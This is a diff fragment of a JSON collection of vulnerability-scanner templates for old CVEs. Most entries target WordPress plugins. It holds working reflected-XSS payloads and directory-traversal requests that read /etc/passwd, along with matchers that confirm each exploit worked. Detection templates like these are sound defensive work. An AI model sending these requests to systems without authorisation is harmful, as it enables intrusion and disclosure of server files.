+            "{{BaseURL}}/wp-content/plugins/shortcode–ninja/preview-shortcode-external.php?shortcode=shortcode%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3e"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2014-4558",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2014-4558",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Cross-site scripting (XSS) vulnerability in test-plugin.php in the Swipe Checkout for WooCommerce plugin 2.7.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the api_url parameter.",
+        "name": "WooCommerce Swipe <= 2.7.1 - Unauthenticated Reflected XSS",
+        "reference": "- https://wpscan.com/vulnerability/37d7936a-165f-4c37-84a6-7ba5b59a0301\n- https://nvd.nist.gov/vuln/detail/CVE-2014-4558\n",
+        "severity": "medium",
+        "tags": "cve,cve2014,wordpress,wp-plugin,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "'><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/swipehq–payment–gateway–woocommerce/test-plugin.php?api_url=api_url%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E "
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2014-4561",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2014-4561",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "The ultimate-weather plugin 1.0 for WordPress has XSS",
+        "name": "Ultimate Weather Plugin <= 1.0 - Unauthenticated Reflected XSS",
+        "reference": "- https://wpscan.com/vulnerability/5c358ef6-8059-4767-8bcb-418a45b2352d\n- https://nvd.nist.gov/vuln/detail/CVE-2014-4561\n",
+        "severity": "medium",
+        "tags": "cve,cve2014,wordpress,wp-plugin,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/ultimate–weather–plugin/magpierss/scripts/magpie_debug.php?url=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2014-4592",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2014-4592",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Cross-site scripting (XSS) vulnerability in rss.class/scripts/magpie_debug.php in the WP-Planet plugin 0.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the url parameter.",
+        "name": "WP Planet <= 0.1 - Unauthenticated Reflected XSS",
+        "reference": "- https://wpscan.com/vulnerability/3c9a3a97-8157-4976-8148-587d923e1fb3\n- https://nvd.nist.gov/vuln/detail/CVE-2014-4592\n",
+        "severity": "medium",
+        "tags": "cve,cve2014,wordpress,wp-plugin,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/wp–planet/rss.class/scripts/magpie_debug.php?url=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2014-4940",
       "info": {
         "author": "daffainfo",
@@ -5394,6 +7605,77 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/tera-charts/charts/zoomabletreemap.php?fn=../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2014-5111",
+      "info": {
+        "author": "daffainfo",
+        "description": "Multiple directory traversal vulnerabilities in Fonality trixbox allow remote attackers to read arbitrary files via a .. (dot dot) in the lang parameter to (1) home/index.php, (2) asterisk_info/asterisk_info.php, (3) repo/repo.php, or (4) endpointcfg/endpointcfg.php in maint/modules/.",
+        "name": "Fonality trixbox - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/39351\n- https://www.cvedetails.com/cve/CVE-2014-5111\n",
+        "severity": "high",
+        "tags": "cve,cve2014,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/maint/modules/endpointcfg/endpointcfg.php?lang=../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2014-5258",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in showTempFile.php in webEdition CMS before 6.3.9.0 Beta allows remote authenticated users to read arbitrary files via a .. (dot dot) in the file parameter.",
+        "name": "webEdition 6.3.8.0 - Directory Traversal",
+        "reference": [
+          "https://www.exploit-db.com/exploits/34761",
+          "https://www.cvedetails.com/cve/CVE-2014-5258"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2014,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/webEdition/showTempFile.php?file=../../../../etc/passwd"
           ]
         }
       ]
@@ -6036,6 +8318,83 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/_fragment?_path=_controller=phpcredits&flag=-1"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2015-4414",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in download_audio.php in the SE HTML5 Album Audio Player (se-html5-album-audio-player) plugin 1.1.0 and earlier for WordPress allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter.",
+        "name": "WordPress Plugin SE HTML5 Album Audio Player 1.1.0 - Directory Traversal",
+        "reference": [
+          "https://www.exploit-db.com/exploits/37274",
+          "https://www.cvedetails.com/cve/CVE-2015-4414"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2015,wordpress,wp-plugin,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2015-4632",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2015-4632",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-22"
+        },
+        "description": "Multiple directory traversal vulnerabilities in Koha 3.14.x before 3.14.16, 3.16.x before 3.16.12, 3.18.x before 3.18.08, and 3.20.x before 3.20.1 allow remote attackers to read arbitrary files via a ..%2f (dot dot encoded slash) in the template_path parameter to (1) svc/virtualshelves/search or (2) svc/members/search.",
+        "name": "Koha 3.20.1 - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/37388\n- https://www.cvedetails.com/cve/CVE-2015-4632\n",
+        "severity": "high",
+        "tags": "cve,cve2015,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi-bin/koha/svc/virtualshelves/search?template_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
           ]
         }
       ]
@@ -14453,6 +16812,54 @@
       ]
     },
     {
+      "id": "CVE-2018–9845",
+      "info": {
+        "author": "philippedelteil",
+        "classification": {
+          "cve-id": "CVE-2018-9845",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8
+        },
+        "name": "Etherpad Lite before 1.6.4 is exploitable for admin access.",
+        "reference": [
+          "https://infosecwriteups.com/account-takeovers-believe-the-unbelievable-bb98a0c251a4",
+          "https://github.com/ether/etherpad-lite/commit/ffe24c3dd93efc73e0cbf924db9a0cc40be9511b",
+          "https://nvd.nist.gov/vuln/detail/CVE-2018-9845"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2018,etherpad,auth-bypass"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Etherpad version",
+                "Plugin manager",
+                "Installed parts"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "max-redirects": 2,
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Admin"
+          ],
+          "redirects": true
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-9995",
       "info": {
         "author": "princechaddha",
@@ -14498,54 +16905,6 @@
           "path": [
             "{{BaseURL}}/device.rsp?opt=user&cmd=list"
           ]
-        }
-      ]
-    },
-    {
-      "id": "CVE-2018–9845",
-      "info": {
-        "author": "philippedelteil",
-        "classification": {
-          "cve-id": "CVE-2018-9845",
-          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-          "cvss-score": 9.8
-        },
-        "name": "Etherpad Lite before 1.6.4 is exploitable for admin access.",
-        "reference": [
-          "https://infosecwriteups.com/account-takeovers-believe-the-unbelievable-bb98a0c251a4",
-          "https://github.com/ether/etherpad-lite/commit/ffe24c3dd93efc73e0cbf924db9a0cc40be9511b",
-          "https://nvd.nist.gov/vuln/detail/CVE-2018-9845"
-        ],
-        "severity": "critical",
-        "tags": "cve,cve2018,etherpad,auth-bypass"
-      },
-      "requests": [
-        {
-          "matchers": [
-            {
-              "condition": "and",
-              "part": "body",
-              "type": "word",
-              "words": [
-                "Etherpad version",
-                "Plugin manager",
-                "Installed parts"
-              ]
-            },
-            {
-              "status": [
-                200
-              ],
-              "type": "status"
-            }
-          ],
-          "matchers-condition": "and",
-          "max-redirects": 2,
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/Admin"
-          ],
-          "redirects": true
         }
       ]
     },
